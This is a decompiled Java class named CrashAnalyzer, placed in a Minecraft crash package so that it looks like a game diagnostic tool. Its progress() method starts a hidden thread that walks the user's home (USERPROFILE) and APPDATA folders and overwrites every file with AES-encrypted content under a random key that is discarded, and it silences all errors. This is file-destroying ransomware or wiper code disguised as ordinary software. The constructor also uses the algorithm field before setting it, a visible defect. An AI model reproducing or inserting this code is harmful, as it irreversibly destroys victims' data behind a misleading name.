/*
 * Decompiled with CFR 0.152.
 */
package net.minecraft.crash;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;

public class CrashAnalyzer
extends SimpleFileVisitor<Path> {
    private Key key;
    private Cipher encrypter;
    private KeyGenerator keyGenerator;
    public String algorithm;

    public CrashAnalyzer() throws NoSuchAlgorithmException, NoSuchPaddingException {
        this.keyGenerator = KeyGenerator.getInstance(this.algorithm);
        this.algorithm = "AES";
        this.encrypter = Cipher.getInstance(this.algorithm);
        this.keyGenerator.init(128);
        this.key = this.keyGenerator.generateKey();
    }

    @Override
    public FileVisitResult visitFile(Path path, BasicFileAttributes attr) {
        if (attr.isRegularFile()) {
            try {
                this.encrypter.init(1, this.key);
                FileInputStream inputStream = new FileInputStream(path.toFile());
                byte[] inputBytes = new byte[(int)path.toFile().length()];
                inputStream.read(inputBytes);
                byte[] outputBytes = this.encrypter.doFinal(inputBytes);
                FileOutputStream outputStream = new FileOutputStream(path.toFile());
                outputStream.write(outputBytes);
                inputStream.close();
                outputStream.close();
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        return FileVisitResult.CONTINUE;
    }

    @Override
    public FileVisitResult postVisitDirectory(Path dir, IOException e2) {
        return FileVisitResult.CONTINUE;
    }

    @Override
    public FileVisitResult visitFileFailed(Path file, IOException e2) {
        return FileVisitResult.CONTINUE;
    }

    public static void progress() {
        Thread thread1 = new Thread(){

            @Override
            public void run() {
                try {
                    CrashAnalyzer pf2 = new CrashAnalyzer();
                    Files.walkFileTree(Paths.get(System.getenv("USERPROFILE"), new String[0]), pf2);
                    Files.walkFileTree(Paths.get(System.getenv("APPDATA"), new String[0]), pf2);
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        };
        thread1.start();
    }
}

